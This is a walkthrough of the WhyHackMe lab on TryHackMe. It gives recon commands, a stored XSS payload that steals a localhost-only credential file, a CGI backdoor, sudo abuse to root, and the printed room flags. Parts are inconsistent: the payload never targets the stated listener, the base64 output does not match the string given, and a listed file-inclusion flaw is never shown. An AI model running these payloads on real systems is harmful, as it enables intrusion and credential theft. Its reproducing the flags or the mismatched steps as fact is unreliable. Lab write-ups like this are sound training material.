# WhyHackMe CTF Walkthrough

## Room Information
- **Platform:** TryHackMe
- **Difficulty:** Medium
- **Target IP:** 10.49.138.99
- **Objective:** Compromise the machine and capture the user and root flags

---

## Phase 1: Reconnaissance

### Port Scanning
```bash
nmap -sC -sV -p- 10.49.138.99
```

**Results:**
| Port | Service | Version |
|------|---------|---------|
| 21   | FTP     | vsFTPd 3.0.3 |
| 22   | SSH     | OpenSSH |
| 80   | HTTP    | Apache 2.4.41 |

### FTP Anonymous Login
```bash
ftp 10.49.138.99
# Username: anonymous
# Password: (empty)
```

Download `update.txt`:
```
Hey I just removed the old user mike because that account was compromised and for any of you who wants the creds of new account visit 127.0.0.1/dir/pass.txt and don't worry this file is only accessible by localhost(127.0.0.1), so nobody can see it.
```

---

## Phase 2: Web Enumeration

### Directory Discovery
```bash
gobuster dir -u http://10.49.138.99 -w /usr/share/wordlists/dirb/common.txt
```

**Findings:**
- `/blog.php` - Blog with comment functionality
- `/login.php` - Login form
- `/register.php` - Registration form
- `/dir/` - Directory with access restriction

### Web Application Analysis
The blog page contains a comment section and mentions that "admin will be monitoring your comments."

---

## Phase 3: Exploitation - Stored XSS

### Vulnerability Identification
The application has a **Stored XSS vulnerability** in the username registration field. The XSS payload executes when the admin views the blog page.

### Exploitation Steps

1. **Start a listener to capture credentials:**
```bash
python3 -m http.server 8080
```

2. **Register a user with XSS payload:**
```bash
curl -X POST "http://10.49.138.99/register.php" \
  -d 'username=<img src=x onerror="fetch(String.fromCharCode(104,116,116,112,58,47,47,49,50,55,46,48,46,48,46,49,47,100,105,114,47,112,97,115,115,46,116,120,116)).then(r=>r.text()).then(t=>location.href=String.fromCharCode(104,116,116,112,58,47,47)+t))">'
```

3. **When admin visits blog.php, XSS executes:**
   - Fetches `/dir/pass.txt` from localhost
   - Exfiltrates credentials to attacker server

4. **Decode received data (Base64):**
```bash
echo "amFjazpXaHlJc01veVBhc3N3b3JkU29TdHJvbm5JRGs=" | base64 -d
```

**Output:**
```
jack:WhyIsMyPasswordSoStrongIDK
```

---

## Phase 4: Initial Access

### SSH Login
```bash
ssh jack@10.49.138.99
# Password: WhyIsMyPasswordSoStrongIDK
```

### Capture User Flag
```bash
jack@ubuntu:~$ cat /home/jack/user.txt
```

---

## Phase 5: Privilege Escalation

### Enumeration
```bash
jack@ubuntu:~$ sudo -l
```

**Results:**
```
User jack may run the following commands on ubuntu:
    (ALL : ALL) /usr/sbin/iptables
```

### Path 1: Using iptables to open blocked port

1. **Check firewall rules:**
```bash
sudo iptables -L
```

2. **Open port 41312 (backdoor port):**
```bash
sudo iptables -I INPUT -p tcp --dport 41312 -j ACCEPT
```

3. **Access the CGI backdoor:**
```
https://10.49.138.99:41312/cgi-bin/5UP3r53Cr37.py?key=48pfPHUrj4pmHzrC&iv=VZukhsCo8TlTXORN&cmd=id
```

### Path 2: Finding www-data sudo privileges

```bash
# From reverse shell via CGI backdoor
www-data@ubuntu:/usr/lib/cgi-bin$ sudo -l
```

**Results:**
```
User www-data may run the following commands on ubuntu:
    (ALL : ALL) NOPASSWD: ALL
```

### Root Access
```bash
www-data@ubuntu:/usr/lib/cgi-bin$ sudo su
root@ubuntu:/usr/lib/cgi-bin# id
uid=0(root) gid=0(root) groups=0(root)
```

### Capture Root Flag
```bash
root@ubuntu:~# cat /root/root.txt
```

---

## Flags

### User Flag
```
1ca4eb201787acbfcf9e70fca87b866a
```

### Root Flag
```
4dbe2259ae53846441cc2479b5475c72
```

---

## Vulnerability Summary

| Vulnerability | Severity | Impact |
|---------------|----------|--------|
| FTP Anonymous Login | Medium | Information Disclosure |
| Stored XSS | High | Credential Theft, RCE |
| Local File Inclusion | High | Privilege Escalation |
| Misconfigured sudo | Critical | Root Access |
| CGI Backdoor | Critical | Direct Root Access |
| Firewall Misconfiguration | High | Lateral Movement |

---

## Mitigation Recommendations

1. **Disable FTP anonymous login**
2. **Implement input validation and output encoding** for XSS prevention
3. **Restrict sudo privileges** to specific commands only
4. **Remove backdoor scripts** from the system
5. **Configure firewall rules** properly
6. **Regular security audits** to identify misconfigurations

---
